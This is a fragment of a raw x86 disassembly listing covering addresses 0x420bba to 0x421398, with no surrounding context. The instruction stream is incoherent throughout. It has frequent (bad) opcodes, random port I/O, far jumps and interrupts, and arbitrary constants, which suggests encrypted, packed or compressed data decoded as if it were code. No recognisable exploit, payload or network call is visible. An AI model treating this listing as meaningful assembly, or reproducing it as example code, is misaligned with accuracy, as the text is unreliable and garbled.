  420bba:	fdivr  st(1),st
  420bbc:	js     0x420b43
  420bbe:	add    DWORD PTR [edi+0xdfbc75a],edi
  420bc4:	mov    dh,0x9c
  420bc6:	dec    esi
  420bc7:	fdivr  DWORD PTR [ecx]
  420bc9:	jle    0x420c20
  420bcb:	pop    ss
  420bcc:	pop    ss
  420bcd:	sub    eax,DWORD PTR [ebx]
  420bcf:	std    
  420bd0:	dec    edi
  420bd1:	jne    0x420bc2
  420bd3:	rol    DWORD PTR [edi],1
  420bd5:	sahf   
  420bd6:	fcom   DWORD PTR [edx+ecx*1-0x1d]
  420bda:	cmp    al,ch
  420bdc:	fwait
  420bdd:	mov    eax,0x612831c
  420be2:	xchg   ebp,eax
  420be3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420be4:	xchg   ebp,eax
  420be5:	mov    ebp,0x7cd952ae
  420bea:	mul    BYTE PTR [eax+0x6]
  420bed:	js     0x420c3b
  420bef:	fcomp  DWORD PTR [edi-0x72]
  420bf2:	rcl    BYTE PTR [edx-0x18a22082],1
  420bf8:	pop    edx
  420bf9:	inc    eax
  420bfa:	jbe    0x420b89
  420bfc:	es inc esp
  420bfe:	cmp    BYTE PTR [ebp-0x58],ch
  420c01:	iret   
  420c02:	dec    esi
  420c03:	mov    bl,0x10
  420c05:	xor    eax,0x5b99d360
  420c0a:	dec    eax
  420c0b:	loope  0x420c0e
  420c0d:	test   BYTE PTR ds:0xba11c31b,dh
  420c13:	cmp    al,0x7f
  420c15:	outs   dx,BYTE PTR ds:[esi]
  420c16:	pop    esp
  420c17:	and    ch,BYTE PTR [ecx]
  420c19:	stc    
  420c1a:	popa   
  420c1b:	dec    ebp
  420c1c:	mov    ch,0x87
  420c1e:	test   al,0xd5
  420c20:	xchg   esi,eax
  420c21:	das    
  420c22:	cmp    DWORD PTR [edx+0x20d0d199],0xbcf46cb6
  420c2c:	popf   
  420c2d:	mov    ebp,DWORD PTR [eax+eax*1]
  420c30:	or     ah,BYTE PTR [esi+0x2d]
  420c33:	adc    dl,BYTE PTR [ebx+0x65]
  420c36:	jge    0x420c89
  420c38:	scas   eax,DWORD PTR es:[edi]
  420c39:	mov    eax,ds:0x6dd5ca73
  420c3e:	rcr    BYTE PTR [edx-0x1b],1
  420c41:	dec    edx
  420c42:	or     eax,DWORD PTR [esi]
  420c44:	in     al,0x5c
  420c46:	sub    al,0xb4
  420c48:	push   0xdbeef7b3
  420c4d:	xor    BYTE PTR [ebx-0x7ccc3c7c],ch
  420c53:	and    eax,DWORD PTR [ebp-0x48688435]
  420c59:	cmp    al,BYTE PTR [ecx-0x2b]
  420c5c:	popa   
  420c5d:	add    eax,0x3ee74486
  420c62:	sub    eax,0x85f77fe
  420c67:	fsubr  DWORD PTR [eax-0x230ae328]
  420c6d:	and    ecx,DWORD PTR [ecx-0x2f]
  420c70:	xchg   cx,ax
  420c72:	leave  
  420c73:	and    edx,edx
  420c75:	push   esi
  420c76:	sbb    cl,BYTE PTR [edi+0x75d16ee1]
  420c7c:	ins    BYTE PTR es:[edi],dx
  420c7d:	in     eax,0x19
  420c7f:	xor    BYTE PTR [ebp+0x2c],bl
  420c82:	int    0x93
  420c84:	mov    ds:0x74727571,al
  420c89:	call   0x1a66:0xbffb51e8
  420c90:	dec    ebp
  420c91:	adc    DWORD PTR [edi-0x4a],ebx
  420c94:	add    bh,BYTE PTR [esi]
  420c96:	mov    bh,0x4e
  420c98:	sub    BYTE PTR [edx+0x2ec10029],0xdb
  420c9f:	inc    eax
  420ca0:	add    DWORD PTR [edi+0x26],ebp
  420ca3:	lods   al,BYTE PTR ds:[esi]
  420ca4:	arpl   WORD PTR [edi],dx
  420ca6:	mov    dl,0xdf
  420ca8:	lea    eax,[edi]
  420caa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cab:	ins    BYTE PTR es:[edi],dx
  420cac:	fistp  QWORD PTR [ecx]
  420cae:	loope  0x420c44
  420cb0:	push   edx
  420cb1:	pop    edx
  420cb2:	mov    al,ds:0x1634647d
  420cb7:	xor    cl,BYTE PTR [esi+ecx*8+0x71a27931]
  420cbe:	loope  0x420cf6
  420cc0:	bound  esp,QWORD PTR [esi]
  420cc2:	pop    edi
  420cc3:	or     ebp,DWORD PTR [ecx+0x74]
  420cc6:	in     eax,0xa8
  420cc8:	and    ah,BYTE PTR [edi-0x4039f73a]
  420cce:	imul   ebx,DWORD PTR [edi+eax*4],0x8835e7d7
  420cd5:	and    eax,DWORD PTR [esp+edi*1-0x47e2eb38]
  420cdc:	pushf  
  420cdd:	mov    ch,0xa4
  420cdf:	push   eax
  420ce0:	sbb    ebx,DWORD PTR [eax]
  420ce2:	mov    ds:0x8727bdb1,eax
  420ce7:	xchg   esi,eax
  420ce8:	and    eax,DWORD PTR [edi+0x1b]
  420ceb:	or     dh,dl
  420ced:	(bad)  
  420cee:	fistp  DWORD PTR [esi-0x1798451b]
  420cf4:	cmp    DWORD PTR [eax-0xb],ecx
  420cf7:	fyl2xp1 
  420cf9:	mov    ch,0x1
  420cfb:	xchg   ebx,eax
  420cfc:	mov    ds:0x136b434d,al
  420d01:	(bad)  
  420d03:	mov    ecx,0x27253c6f
  420d08:	push   eax
  420d09:	push   es
  420d0a:	repz int 0x82
  420d0d:	fimul  WORD PTR [edi+0xa0c0cb5]
  420d13:	inc    ecx
  420d14:	mov    edx,DWORD PTR [eax]
  420d16:	ret    
  420d17:	dec    eax
  420d18:	dec    eax
  420d19:	cmc    
  420d1a:	or     al,0x67
  420d1c:	jns    0x420d51
  420d1e:	dec    esp
  420d1f:	shl    al,cl
  420d21:	es mov dh,0xf0
  420d24:	fild   DWORD PTR [esi-0x1a]
  420d27:	js     0x420d85
  420d29:	pop    ds
  420d2a:	push   es
  420d2b:	scas   eax,DWORD PTR es:[edi]
  420d2c:	or     DWORD PTR [edx-0x72c75a20],esp
  420d32:	popf   
  420d33:	aaa    
  420d34:	cmc    
  420d35:	mov    dh,0x82
  420d37:	imul   ebx,edx,0xffffffae
  420d3a:	out    0xfd,al
  420d3c:	adc    dl,BYTE PTR [ecx-0x36]
  420d3f:	push   0x39
  420d41:	je     0x420d82
  420d43:	bound  edx,QWORD PTR [ebx+0x796608d8]
  420d49:	add    edx,esi
  420d4b:	xchg   esp,eax
  420d4c:	rcr    DWORD PTR [esp+edx*8+0x25ed87c],0xca
  420d54:	fild   WORD PTR [eax-0x5f]
  420d57:	fs clc 
  420d59:	push   ebp
  420d5a:	or     al,0xd1
  420d5c:	repz push cs
  420d5e:	nop
  420d5f:	lock dec edx
  420d61:	xor    DWORD PTR [edx+ecx*2-0x5cb023d9],ecx
  420d68:	xchg   ecx,edi
  420d6a:	jbe    0x420da6
  420d6c:	jbe    0x420cf1
  420d6e:	cmp    al,0x71
  420d70:	push   ss
  420d71:	pushf  
  420d72:	cmp    DWORD PTR [edx-0xf1708b9],edi
  420d78:	dec    esp
  420d79:	aaa    
  420d7a:	xchg   ecx,eax
  420d7b:	ret    
  420d7c:	adc    ch,BYTE PTR [ebx*1+0x3c17c08d]
  420d83:	pop    ebx
  420d84:	mov    BYTE PTR [ecx+ebp*4-0x4d],0xbf
  420d89:	jle    0x420d54
  420d8b:	call   0x102b8a45
  420d90:	xor    al,0xd3
  420d92:	sub    bl,BYTE PTR [edx-0x1a]
  420d95:	(bad)  
  420d96:	int    0x43
  420d98:	dec    ebp
  420d99:	add    eax,0x5c3580eb
  420d9e:	xor    esp,DWORD PTR [eax-0x70]
  420da1:	clc    
  420da2:	idiv   DWORD PTR [edx-0x27]
  420da5:	sti    
  420da6:	pop    ebx
  420da7:	push   0x1b00cd92
  420dac:	jp     0x420dbe
  420dae:	shl    BYTE PTR fs:[esi+0x5a6846ae],cl
  420db5:	push   eax
  420db6:	mov    edx,DWORD PTR [eax-0x7bcad516]
  420dbc:	sti    
  420dbd:	popf   
  420dbe:	ins    DWORD PTR es:[edi],dx
  420dbf:	dec    ebx
  420dc0:	loop   0x420d96
  420dc2:	add    ecx,DWORD PTR [esi-0x6d]
  420dc5:	xchg   edi,eax
  420dc6:	rcr    BYTE PTR [eax],cl
  420dc8:	mov    ah,0xba
  420dca:	loop   0x420dff
  420dcc:	mov    edi,0x56f1f63b
  420dd1:	inc    ebp
  420dd2:	pop    es
  420dd3:	in     al,dx
  420dd4:	fmul   DWORD PTR [ecx-0x64]
  420dd7:	rol    bl,1
  420dd9:	xchg   dh,dl
  420ddb:	loope  0x420d72
  420ddd:	enter  0x11ee,0x1f
  420de1:	jle    0x420e46
  420de3:	mov    edi,edx
  420de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420de6:	xchg   edi,eax
  420de7:	mov    ebp,0xd5802581
  420dec:	xchg   DWORD PTR [edx-0x53],edx
  420def:	mov    ah,0x97
  420df1:	push   edi
  420df2:	push   esi
  420df3:	mov    ebp,0xa0916373
  420df8:	ss in  eax,dx
  420dfa:	fdivr  st(4),st
  420dfc:	mov    eax,0xb15ba148
  420e01:	out    dx,eax
  420e02:	xor    al,0x2d
  420e04:	jge    0x420df8
  420e06:	jg     0x420e42
  420e08:	rcl    eax,cl
  420e0a:	push   edi
  420e0b:	push   eax
  420e0c:	sbb    DWORD PTR [edx-0x74cb3d0c],0x2c
  420e13:	adc    BYTE PTR [edx+0x55],dh
  420e16:	jno    0x420dd1
  420e18:	and    al,0xd1
  420e1a:	das    
  420e1b:	(bad)  
  420e1c:	pop    esi
  420e1d:	stos   BYTE PTR es:[edi],al
  420e1e:	arpl   WORD PTR [esi],di
  420e20:	shl    BYTE PTR [esi-0x1997fb39],1
  420e26:	into   
  420e27:	jne    0x420dec
  420e29:	out    dx,eax
  420e2a:	jmp    0x7de8fd44
  420e2f:	mov    eax,0xcb650fdc
  420e34:	sti    
  420e35:	sub    BYTE PTR gs:[eax+0x19],0x93
  420e3a:	mov    ecx,0x5d2b13ca
  420e3f:	dec    ecx
  420e40:	push   eax
  420e41:	add    eax,0xdfd26a13
  420e46:	push   fs
  420e48:	retf   0x53b0
  420e4b:	rcr    BYTE PTR [esi-0x4415ece],0xa2
  420e52:	dec    ecx
  420e53:	sub    eax,0x51289e81
  420e58:	(bad)  
  420e59:	sbb    BYTE PTR [ecx],ch
  420e5b:	out    0xdc,eax
  420e5d:	(bad)  
  420e5e:	lods   al,BYTE PTR ds:[esi]
  420e5f:	push   esi
  420e60:	sbb    BYTE PTR ds:0xb263d709,dl
  420e66:	fbld   TBYTE PTR [ecx-0x1a]
  420e69:	adc    ah,BYTE PTR [edx+edi*2+0x6cea08bc]
  420e70:	dec    ebx
  420e71:	aaa    
  420e72:	push   eax
  420e73:	or     ebp,ebp
  420e75:	pop    ds
  420e76:	fs push ds
  420e78:	xchg   ebx,eax
  420e79:	xchg   edx,eax
  420e7a:	retf   0x2420
  420e7d:	inc    esp
  420e7e:	stc    
  420e7f:	loop   0x420e60
  420e81:	jb     0x420e9f
  420e83:	mov    ecx,0xbc133891
  420e88:	retf   0x5bc6
  420e8b:	adc    ch,BYTE PTR [edx-0x6d]
  420e8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e8f:	mov    cl,0x64
  420e91:	push   ebp
  420e92:	mov    ecx,es
  420e94:	pop    eax
  420e95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e96:	adc    eax,0x7b398a01
  420e9b:	stos   BYTE PTR es:[edi],al
  420e9c:	sahf   
  420e9d:	push   edx
  420e9e:	or     BYTE PTR [ecx+0x5792a8ce],dh
  420ea4:	int3   
  420ea5:	mov    cs,WORD PTR [edx+ebx*1-0x6]
  420ea9:	xchg   DWORD PTR [ebp-0x59],ebx
  420eac:	rcr    DWORD PTR [esi+0xaa1f518],cl
  420eb2:	jmp    0x420e4a
  420eb4:	(bad)  
  420eb5:	ins    DWORD PTR es:[edi],dx
  420eb6:	adc    eax,0x40535e65
  420ebb:	in     al,0x29
  420ebd:	(bad)  
  420ebe:	scas   al,BYTE PTR es:[edi]
  420ebf:	dec    ebp
  420ec0:	jb     0x420efa
  420ec2:	cmp    al,0x13
  420ec4:	mov    eax,0x46a66853
  420ec9:	in     eax,dx
  420eca:	hlt    
  420ecb:	add    eax,0x7998b961
  420ed0:	nop
  420ed1:	push   esi
  420ed2:	(bad)  
  420ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ed4:	cmp    al,0x5d
  420ed6:	popf   
  420ed7:	ss xor eax,0x2251da3a
  420edd:	cli    
  420ede:	sub    edx,DWORD PTR [edx-0x7b]
  420ee1:	adc    cl,dl
  420ee3:	arpl   WORD PTR [esi],sp
  420ee5:	and    eax,0xd8fdd908
  420eea:	dec    eax
  420eeb:	mov    al,0xcb
  420eed:	lea    edi,[ebp-0x24af019]
  420ef3:	pusha  
  420ef4:	dec    esp
  420ef5:	jecxz  0x420e77
  420ef7:	cmp    al,bl
  420ef9:	cmp    esp,DWORD PTR [edx+edx*2]
  420efc:	pop    ss
  420efd:	or     eax,DWORD PTR [ebx]
  420eff:	add    BYTE PTR [edi],bh
  420f01:	ror    DWORD PTR [ebp+0x3c7b87c],1
  420f07:	xchg   esi,eax
  420f08:	mov    bh,0xd
  420f0a:	les    esp,FWORD PTR [ebp-0x55]
  420f0d:	dec    ebp
  420f0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f0f:	daa    
  420f10:	or     ecx,DWORD PTR [edx]
  420f12:	or     BYTE PTR [ebx+ebx*4],dl
  420f15:	add    bh,BYTE PTR [ebx-0x622afac1]
  420f1b:	popf   
  420f1c:	addr16 jnp 0x420f0b
  420f1f:	ja     0x420ebb
  420f21:	mov    cl,BYTE PTR [ecx-0x76107090]
  420f27:	(bad)  
  420f28:	mov    ds:0xc9ba4add,eax
  420f2d:	and    DWORD PTR [ecx],ebx
  420f2f:	addr16 mov dh,0xe8
  420f32:	mov    ebp,0x692a9636
  420f37:	(bad)  
  420f38:	das    
  420f39:	mov    ebx,0x6c11e8e0
  420f3e:	inc    edx
  420f3f:	mov    eax,eax
  420f41:	jg     0x420f4c
  420f43:	add    BYTE PTR [ebx-0x383d6abf],ah
  420f49:	pop    ebx
  420f4a:	aam    0xf4
  420f4c:	rcl    BYTE PTR [esi],0xb5
  420f4f:	mov    WORD PTR [edi],?
  420f51:	or     al,0xd4
  420f53:	xchg   esp,eax
  420f54:	(bad)  
  420f55:	push   ebx
  420f56:	jmp    0x420fd7
  420f58:	mov    bh,0xc9
  420f5a:	xlat   BYTE PTR ds:[ebx]
  420f5b:	aam    0xf8
  420f5d:	jmp    0x420f34
  420f5f:	(bad)  
  420f60:	mov    ds:0x704c77d8,al
  420f65:	or     bl,bl
  420f67:	div    BYTE PTR [eax-0x64d1c71f]
  420f6d:	mov    eax,0x687a931f
  420f72:	fs jbe 0x420f1a
  420f75:	fisubr WORD PTR [edx]
  420f77:	mov    al,BYTE PTR [ebx+0x5be80d76]
  420f7d:	iret   
  420f7e:	out    0xfe,al
  420f80:	pop    edi
  420f81:	mov    ecx,0x3ac5c66c
  420f86:	xor    al,0xd0
  420f88:	outs   dx,BYTE PTR ds:[esi]
  420f89:	enter  0xdd64,0x4a
  420f8d:	and    BYTE PTR [eax+0x2d],bl
  420f90:	mov    ch,0xe8
  420f92:	adc    al,0xbc
  420f94:	in     al,0xff
  420f96:	daa    
  420f97:	js     0x420f88
  420f99:	push   edi
  420f9a:	inc    esp
  420f9b:	mov    bh,0x7c
  420f9d:	fld    QWORD PTR [edx-0x6778a330]
  420fa3:	fadd   st,st(0)
  420fa5:	(bad)  [edx-0x6d04eac7]
  420fab:	popf   
  420fac:	cdq    
  420fad:	popa   
  420fae:	pusha  
  420faf:	fwait
  420fb0:	ret    
  420fb1:	test   eax,0x4476c70f
  420fb6:	inc    esp
  420fb7:	mov    cl,0x1a
  420fb9:	jbe    0x420fb6
  420fbb:	xor    esi,DWORD PTR [ecx+0x2d00b7ba]
  420fc1:	push   esp
  420fc2:	adc    eax,DWORD PTR [edi]
  420fc4:	repz mov ebx,0x5b447b7d
  420fca:	add    eax,DWORD PTR [ecx+0x76cc33e5]
  420fd0:	das    
  420fd1:	aaa    
  420fd2:	and    esp,DWORD PTR [edi-0x1e]
  420fd5:	das    
  420fd6:	fist   DWORD PTR [edi+0x16]
  420fd9:	scas   eax,DWORD PTR es:[edi]
  420fda:	jg     0x420f63
  420fdc:	push   es
  420fdd:	in     al,dx
  420fde:	(bad)
  420fe1:	push   es
  420fe2:	cmp    DWORD PTR [edi+0x69d81d2a],esp
  420fe8:	std    
  420fe9:	cmp    eax,0x4d08242c
  420fee:	xchg   esp,eax
  420fef:	lahf   
  420ff0:	ret    0x4732
  420ff3:	stos   BYTE PTR es:[edi],al
  420ff4:	in     eax,0x5
  420ff6:	out    0xf2,al
  420ff8:	mov    esi,0x305828c8
  420ffd:	(bad)  
  420fff:	mov    cl,0x73
  421001:	dec    ecx
  421002:	pop    ss
  421003:	cmp    bh,BYTE PTR [esi-0xaf34b31]
  421009:	(bad)  
  42100a:	jecxz  0x421037
  42100c:	dec    esi
  42100d:	inc    esp
  42100e:	or     edx,ebp
  421010:	cmp    eax,0x3585a8b6
  421015:	mov    esi,0x3ddbe264
  42101a:	mov    eax,0xaf1e3b2a
  42101f:	mov    dh,0xe6
  421021:	jp     0x421096
  421023:	add    ebp,DWORD PTR [eax]
  421025:	repz loop 0x42102d
  421028:	inc    esp
  421029:	mov    ch,0x50
  42102b:	test   al,0xbb
  42102d:	mov    ds:0x48aca13e,al
  421032:	xor    BYTE PTR [ebx+0x65],ah
  421035:	or     ebp,ebx
  421037:	dec    esi
  421038:	jecxz  0x421098
  42103a:	shl    DWORD PTR [ebx-0x1556be0e],0x2e
  421041:	push   ss
  421042:	cs pop ebx
  421044:	dec    edx
  421045:	cwde   
  421046:	push   edx
  421047:	popa   
  421048:	cmc    
  421049:	inc    edx
  42104a:	sbb    BYTE PTR [ebx+0x11],cl
  42104d:	cmp    DWORD PTR [ebx-0x62],esi
  421050:	adc    ebx,DWORD PTR [ebp+eiz*2+0x62813169]
  421057:	ret    
  421058:	loopne 0x421090
  42105a:	outs   dx,BYTE PTR fs:[esi]
  42105c:	out    0x82,eax
  42105e:	shl    esi,0xf9
  421061:	ss jmp 0x9519:0x372cbaf
  421069:	das    
  42106a:	or     eax,0x4662fb87
  42106f:	fidiv  WORD PTR [esi+ebp*4+0x10d6ac1f]
  421076:	lds    esi,FWORD PTR [edi+0x2e]
  421079:	repz adc DWORD PTR [ebx+0x10],esi
  42107d:	ins    DWORD PTR es:[edi],dx
  42107e:	push   0xb5391df2
  421083:	inc    edx
  421084:	inc    esi
  421085:	push   esp
  421086:	push   esp
  421087:	sub    edx,DWORD PTR [eax+0x39]
  42108a:	cdq    
  42108b:	rcr    BYTE PTR [edx],1
  42108d:	or     al,0x56
  42108f:	jae    0x421025
  421091:	sub    BYTE PTR [esi+0x72341d7d],al
  421097:	jmp    0x8784feb1
  42109c:	(bad)  
  42109d:	cmp    edi,esp
  42109f:	jge    0x4210e7
  4210a1:	loopne 0x42110d
  4210a3:	ror    DWORD PTR [eax+0x71dd6a0],cl
  4210a9:	xchg   DWORD PTR [ebx-0x32d4f037],ecx
  4210af:	addr16 cmc 
  4210b1:	jl     0x4210e3
  4210b3:	xor    BYTE PTR [ebp+edx*8+0x7f],ah
  4210b7:	jmp    0x421098
  4210b9:	lock shl BYTE PTR [edi+edx*1-0x68],0x1f
  4210bf:	push   ebp
  4210c0:	es sbb al,0xbf
  4210c3:	repnz add DWORD PTR [ebp+0x1d],esi
  4210c7:	xchg   edi,eax
  4210c8:	scas   eax,DWORD PTR es:[edi]
  4210c9:	into   
  4210ca:	repnz stos BYTE PTR es:[edi],al
  4210cc:	ds or  al,0xb2
  4210cf:	jne    0x421075
  4210d1:	add    ecx,ebp
  4210d3:	pop    ss
  4210d4:	jno    0x4210a7
  4210d6:	cmp    cl,cl
  4210d8:	cld    
  4210d9:	adc    DWORD PTR [edx+0x1b34ea92],0xffffffce
  4210e0:	repz out dx,eax
  4210e2:	jae    0x42108c
  4210e4:	and    BYTE PTR ds:[eax],bh
  4210e7:	gs xchg edi,eax
  4210e9:	sbb    al,dh
  4210eb:	push   ss
  4210ec:	sahf   
  4210ed:	out    dx,eax
  4210ee:	sbb    BYTE PTR [edi],dl
  4210f0:	push   0xb13df43e
  4210f5:	fs mov ss:0x2a4577ee,al
  4210fc:	enter  0x6736,0x15
  421100:	out    dx,eax
  421101:	inc    edi
  421102:	adc    BYTE PTR ds:0xbf38d5e1,bh
  421108:	inc    ebp
  421109:	mov    ecx,0x1dc4e349
  42110e:	out    0xb3,al
  421110:	(bad)  
  421111:	in     eax,dx
  421112:	cmp    al,0x1c
  421114:	out    dx,al
  421115:	sar    DWORD PTR [ebx+0x21],0xb1
  421119:	jo     0x42112b
  42111b:	push   0xdd00195a
  421120:	or     DWORD PTR [ecx+0x25b3bf0a],ecx
  421126:	xchg   ecx,eax
  421127:	mov    dl,0x3e
  421129:	inc    ebx
  42112a:	dec    eax
  42112b:	ds ret 0x7015
  42112f:	pop    ds
  421130:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421131:	mov    ds:0xbf3771ff,al
  421136:	in     al,dx
  421137:	xchg   esi,eax
  421138:	sbb    esi,DWORD PTR [edi-0x3f]
  42113b:	mov    ecx,0x3246500b
  421140:	mov    eax,0x41937bba
  421145:	inc    edi
  421146:	push   ss
  421147:	jbe    0x42113b
  421149:	mov    ah,0xcf
  42114b:	sahf   
  42114c:	jl     0x421146
  42114e:	mov    edx,0x82dd7acd
  421153:	lock mov cl,BYTE PTR [ebx-0x628b9ee]
  42115a:	adc    BYTE PTR [ebp+ebx*4+0x513cab67],0x22
  421162:	pusha  
  421163:	sti    
  421164:	dec    ebx
  421165:	jg     0x4211a4
  421167:	push   edi
  421168:	retf   
  421169:	mov    BYTE PTR [edx+edx*4],ah
  42116c:	scas   eax,DWORD PTR es:[edi]
  42116d:	jo     0x4210f9
  42116f:	mov    dl,0x87
  421171:	push   ebp
  421172:	and    al,0x81
  421174:	shr    WORD PTR [edi+0x3d47ca31],cl
  42117b:	retf   
  42117c:	add    ah,BYTE PTR [eax+0x37]
  42117f:	cmp    DWORD PTR [eiz*8-0x132de844],0x42
  421187:	cmp    eax,0x445fc884
  42118c:	(bad)  
  42118d:	pushf  
  42118e:	mov    bh,BYTE PTR [ecx+ebp*8]
  421191:	sub    DWORD PTR [ecx],ebp
  421193:	(bad)  
  421194:	mov    bh,0xcf
  421196:	jbe    0x42112e
  421198:	dec    ecx
  421199:	sub    dl,al
  42119b:	bound  edx,QWORD PTR [esi]
  42119d:	jle    0x421140
  42119f:	or     dh,ah
  4211a1:	lds    edx,FWORD PTR [esp+eax*1]
  4211a4:	cmc    
  4211a5:	in     al,dx
  4211a6:	pop    eax
  4211a7:	rol    DWORD PTR [esi+0x7d01234f],1
  4211ad:	jmp    0x421229
  4211af:	data16 int 0x97
  4211b2:	daa    
  4211b3:	in     eax,dx
  4211b4:	pop    ds
  4211b5:	xor    ecx,edi
  4211b7:	(bad)  
  4211b8:	xlat   BYTE PTR ds:[ebx]
  4211b9:	lds    edi,FWORD PTR [ebp-0x63]
  4211bc:	jno    0x42121c
  4211be:	pusha  
  4211bf:	mov    ecx,eax
  4211c1:	jmp    0x622a:0x21de9d10
  4211c8:	rcr    BYTE PTR [esi+0x40],1
  4211cb:	or     BYTE PTR [edi],dl
  4211cd:	and    eax,0x61b01300
  4211d2:	test   eax,0xf852398b
  4211d7:	inc    ebp
  4211d8:	xchg   edi,eax
  4211d9:	cld    
  4211da:	sbb    eax,0x4c0a554d
  4211df:	fidivr WORD PTR [edi-0x4c284166]
  4211e5:	jns    0x421212
  4211e7:	cld    
  4211e8:	adc    BYTE PTR [ebx+0x2d],bh
  4211eb:	xchg   esi,eax
  4211ec:	inc    edi
  4211ed:	xchg   DWORD PTR [eax-0xa],edi
  4211f0:	and    al,0xb7
  4211f2:	jae    0x4211d4
  4211f4:	inc    esi
  4211f5:	sub    ch,BYTE PTR [ebp-0x429f7ac9]
  4211fb:	lea    eax,[ebx]
  4211fd:	pusha  
  4211fe:	push   ebx
  4211ff:	adc    eax,DWORD PTR ds:0x48cf160f
  421205:	mov    esi,0x784e683
  42120a:	std    
  42120b:	xor    cl,al
  42120d:	in     al,dx
  42120e:	outs   dx,DWORD PTR ds:[esi]
  42120f:	mov    ebx,0x3da1325e
  421214:	push   edx
  421215:	sbb    edx,ecx
  421217:	push   ss
  421218:	in     al,0xa2
  42121a:	or     DWORD PTR [esi],ebx
  42121c:	add    al,0x40
  42121e:	sbb    DWORD PTR [eax-0x568c0ad],esp
  421224:	fs sub al,0x23
  421227:	mov    esi,0xd150c3d1
  42122c:	sub    BYTE PTR [edx+edx*1],al
  42122f:	mov    esi,0xd917b31f
  421234:	es adc eax,0x3a86c8fd
  42123a:	add    BYTE PTR [ebx-0x64583a24],bh
  421240:	push   esi
  421241:	xor    ebp,edx
  421243:	add    al,0xa
  421245:	bound  ebx,QWORD PTR [ecx+ebp*4+0x2c6cd5ca]
  42124c:	jle    0x42129c
  42124e:	ss jmp 0x7ff42620
  421254:	sbb    DWORD PTR [ecx+0x1a],0x29
  421258:	mov    edx,0xb8a0f0ee
  42125d:	add    al,ah
  42125f:	ds pushf 
  421261:	imul   edx,DWORD PTR [edx+0x61],0x50405bad
  421268:	mov    edi,0x5bd51a03
  42126d:	mov    esp,0xf98b6520
  421272:	dec    ebx
  421273:	push   cs
  421274:	dec    eax
  421275:	fstp   DWORD PTR [esi-0x22e99fd1]
  42127b:	iret   
  42127c:	mov    BYTE PTR [ebx+0x29],dh
  42127f:	cmc    
  421280:	scas   al,BYTE PTR es:[edi]
  421281:	xchg   ebx,eax
  421282:	dec    edi
  421283:	data16 icebp 
  421285:	adc    DWORD PTR cs:0x14eefdca,edi
  42128c:	(bad)  
  42128d:	iret   
  42128e:	sub    esp,ebx
  421290:	or     DWORD PTR [ebx],ecx
  421292:	shl    BYTE PTR [edi-0x78],0xfd
  421296:	add    al,0x5d
  421298:	push   ebp
  421299:	retf   
  42129a:	xlat   BYTE PTR ds:[ebx]
  42129b:	hlt    
  42129c:	repz fwait
  42129e:	xchg   esp,eax
  42129f:	test   eax,0x1114d998
  4212a4:	pushf  
  4212a5:	pop    ds
  4212a6:	jo     0x421297
  4212a8:	xchg   ecx,eax
  4212a9:	inc    ebx
  4212aa:	mov    ds:0x71c038f6,al
  4212af:	or     ecx,DWORD PTR [ebx+edx*2]
  4212b2:	cmp    eax,0x14c19489
  4212b7:	loope  0x421315
  4212b9:	popf   
  4212ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212bb:	fstp   QWORD PTR [eax]
  4212bd:	fstp   DWORD PTR [eax+0x6a]
  4212c0:	enter  0xebd4,0xb6
  4212c4:	or     BYTE PTR [ecx-0x5cf9866b],bl
  4212ca:	fstp   QWORD PTR [esi-0x58da5439]
  4212d0:	jno    0x421326
  4212d2:	je     0x421267
  4212d4:	jecxz  0x421346
  4212d6:	mov    ds:0xedf71e96,eax
  4212db:	mov    eax,ds:0x8bc6b941
  4212e0:	fmul   DWORD PTR [ebx+0x27c09678]
  4212e6:	mov    ecx,esp
  4212e8:	sbb    BYTE PTR [eax],al
  4212ea:	xor    DWORD PTR [ecx-0x12785a25],0x68
  4212f1:	sub    ebp,DWORD PTR [eax]
  4212f3:	mov    dh,0x9c
  4212f5:	pop    esi
  4212f6:	jle    0x4212eb
  4212f8:	aas    
  4212f9:	call   0x9d9e:0xc01a20f7
  421300:	and    esp,DWORD PTR [edx+0x671a7021]
  421306:	aam    0x8a
  421308:	mov    BYTE PTR [edx],ah
  42130a:	xor    ecx,DWORD PTR [esi+0x7c]
  42130d:	mov    bh,BYTE PTR [ebp-0x7a]
  421310:	int    0x8f
  421312:	sar    BYTE PTR [ebx+0x18],cl
  421315:	jmp    0xb04e:0x9ad99ebe
  42131c:	out    0x64,eax
  42131e:	jmp    DWORD PTR [esi-0x5f7bd02d]
  421324:	adc    ebx,DWORD PTR [edx]
  421326:	cli    
  421327:	sbb    BYTE PTR [ebx-0x7f17f9a2],al
  42132d:	mov    ebp,0xd1781556
  421332:	add    DWORD PTR [esi],esi
  421334:	loop   0x4212f7
  421336:	inc    esp
  421337:	mov    cl,bl
  421339:	std    
  42133a:	out    0x65,eax
  42133c:	(bad)  
  42133d:	ror    ebx,1
  42133f:	mov    ah,0xe8
  421341:	lods   eax,DWORD PTR ds:[esi]
  421342:	cmp    ch,dh
  421344:	call   0xf8b7074
  421349:	out    0x4f,al
  42134b:	ret    
  42134c:	add    dl,BYTE PTR [esi+0x79]
  42134f:	dec    edx
  421350:	daa    
  421351:	add    BYTE PTR ss:[esi-0x16],al
  421355:	in     eax,0x55
  421357:	in     al,dx
  421358:	or     ch,cl
  42135a:	jp     0x42132d
  42135c:	sbb    BYTE PTR [edi-0x12],dl
  42135f:	jmp    0x421317
  421361:	jl     0x42131c
  421363:	mov    ch,0x72
  421365:	mov    cs,WORD PTR [edx+ebx*8+0x47]
  421369:	out    0x97,al
  42136b:	dec    eax
  42136c:	sahf   
  42136d:	xor    bl,BYTE PTR [esp+ebx*4+0x13f5ca57]
  421374:	fs ret 
  421376:	mov    dh,0xbd
  421378:	adc    eax,0x934eb262
  42137d:	(bad)
  421382:	test   eax,0xe986f8b5
  421387:	xchg   ebp,eax
  421388:	sbb    ah,BYTE PTR [esi]
  42138a:	adc    ebx,DWORD PTR [ebp+0x60]
  42138d:	pop    ebx
  42138e:	mov    al,0x1b
  421390:	sti    
  421391:	(bad)  
  421392:	and    eax,0x60a24199
  421397:	hlt    
  421398:	xlat   BYTE PTR ds:[ebx]
